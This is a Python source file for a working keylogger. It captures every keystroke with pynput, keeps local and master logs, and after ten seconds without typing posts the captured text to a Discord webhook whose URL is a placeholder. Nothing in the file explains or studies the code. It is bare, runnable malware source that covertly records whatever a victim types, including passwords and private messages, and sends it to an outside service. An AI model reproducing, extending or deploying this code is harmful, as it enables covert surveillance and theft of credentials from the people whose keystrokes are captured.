import threading, time, os, requests
from pynput.keyboard import Listener, Key
from datetime import datetime


WEBHOOK = "YOUR_DISCORD_WEBHOOK_URL"
LOG_FILE = "output/log.txt"
MASTER_LOG = "output/master_log.txt"
os.makedirs("output", exist_ok=True)

file_lock = threading.Lock()
last_key_time = time.time()
INACTIVITY_DELAY = 10      # seconds of no typing before sending
CHECK_INTERVAL = 1         # how often to check inactivity

def key_writer(key):
    global last_key_time
    last_key_time = time.time()   # reset timer on each keystroke
    try:
        ch = str(key).replace("'", "")
        if key == Key.space:
            ch = " "
        elif key == Key.enter:
            ch = "\n"
        elif key == Key.backspace: # the backspace deleting keys
            with file_lock:
                if os.path.exists(LOG_FILE):
                    with open(LOG_FILE, "r+", encoding="utf-8") as f:
                        data = f.read()
                        f.seek(0); f.truncate(); f.write(data[:-1])
            return
        elif key in (Key.shift, Key.ctrl_l, Key.ctrl_r, Key.alt_l, Key.alt_r, Key.caps_lock):
            return
        if len(ch) == 1:
            with file_lock, open(LOG_FILE, "a", encoding="utf-8") as f:
                f.write(ch)
    except Exception as e:
        print("key_writer error:", e)

def send_to_discord():
    with file_lock:
        if not os.path.exists(LOG_FILE):
            return
        with open(LOG_FILE, "r", encoding="utf-8") as f:
            data = f.read()
        if not data.strip():
            return
        
        # Add timestamp to master log for clarity
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        with open(MASTER_LOG, "a", encoding="utf-8") as master:
            master.write(f"\n[{timestamp}]\n{data}\n")
        
        # Send current chunk with timestamp
        requests.post(WEBHOOK, json={"content": f"```[{timestamp}]\n{data}```"})

        
        # Clear the temp log for next chunk
        open(LOG_FILE, "w", encoding="utf-8").close()
        print(f"[+] Sent log to Discord at {timestamp}")

def monitor_inactivity():# this check for inactivity
    global last_key_time
    while True:
        if time.time() - last_key_time > INACTIVITY_DELAY:
            send_to_discord()
            # bump timer so we don't resend immediately
            last_key_time = time.time()
        time.sleep(CHECK_INTERVAL)

threading.Thread(target=monitor_inactivity, daemon=True).start()
with Listener(on_press=key_writer) as l:
    l.join()
